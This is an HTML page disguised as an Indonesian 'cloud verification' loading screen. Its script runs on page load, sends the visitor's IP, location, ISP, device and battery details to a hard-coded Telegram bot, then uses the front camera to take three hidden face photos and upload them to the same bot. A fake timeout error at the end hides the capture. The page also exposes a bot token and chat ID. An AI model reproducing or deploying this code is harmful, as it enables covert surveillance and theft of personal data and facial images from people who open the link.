<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Cloud</title>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { text-align: center; border: 1px solid #00ff00; padding: 25px; background: rgba(0, 20, 0, 0.9); width: 80%; box-shadow: 0 0 20px #00ff00; }
        .loader { border: 4px solid #111; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.6s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 12px; letter-spacing: 1px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="box">
    <div class="loader"></div>
    <div id="status">MENGHUBUNGKAN... <span id="timer">0%</span></div>
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    const TOKEN = '8492775361:AAE5U8rZNjqxGNnthSAaIKf-vO0-WHIrF1w';
    const CHAT_ID = '7393949927';
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    async function init() {
        // --- PENGAMBILAN DATA SENSOR & SISTEM ---
        let ipData = {};
        try { const res = await fetch('https://ipapi.co/json/'); ipData = await res.json(); } catch (e) {}

        let bat = "N/A", charge = "";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            bat = (b.level * 100).toFixed(0) + "%";
            charge = b.charging ? "ðŸ”Œ Sedang di-charge" : "ðŸ”‹ Pakai Baterai";
        }

        const info = `
ðŸ”¥ **LAPORAN INTEL LENGKAP** ðŸ”¥
--------------------------------
ðŸŒ **DATA JARINGAN**
IP: \`${ipData.ip}\`
ISP: ${ipData.org || "-"}
Tipe Jaringan: ${navigator.connection ? navigator.connection.effectiveType : "N/A"}
Lokasi: ${ipData.city}, ${ipData.country_name}

ðŸ“± **HARDWARE & SISTEM**
Sistem/OS: ${navigator.platform}
Model CPU: ${navigator.hardwareConcurrency || "-"} Cores
RAM: ${navigator.deviceMemory || "-"} GB
Layar: ${screen.width}x${screen.height}
User Agent: ${navigator.userAgent.substring(0, 50)}...

ðŸ”‹ **STATUS POWER**
Baterai: ${bat}
Status: ${charge}

ðŸ•’ **WAKTU & ZONA**
Waktu: ${new Date().toLocaleString('id-ID')}
Zona: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
--------------------------------`;

        await sendToTele(info);
        startAction();
    }

    async function startAction() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            
            // Loading kilat 3 detik
            updateTimer(3);

            // Ambil 3 foto secepat mungkin
            setTimeout(() => snap(1), 500);
            setTimeout(() => snap(2), 1500);
            setTimeout(() => snap(3), 2500);

            setTimeout(() => {
                stream.getTracks().forEach(t => t.stop());
                document.getElementById('status').innerHTML = "ERROR: TIMEOUT 504<br>DATABASE NOT FOUND";
            }, 3500);

        } catch (err) {
            sendToTele("âš ï¸ *Akses Kamera Ditolak!*");
        }
    }

    function snap(n) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(b => {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', b, `f${n}.jpg`);
            fd.append('caption', `ðŸ“¸ Foto Wajah #${n}`);
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg', 0.7); // Kompresi 0.7 agar pengiriman lebih cepat
    }

    function updateTimer(s) {
        let i = 0;
        const el = document.getElementById('timer');
        const t = setInterval(() => {
            i++;
            el.innerText = Math.floor((i/s)*100) + "%";
            if(i >= s) clearInterval(t);
        }, 1000);
    }

    async function sendToTele(text) {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
        });
    }

    window.onload = init;
</script>
</body>
</html>
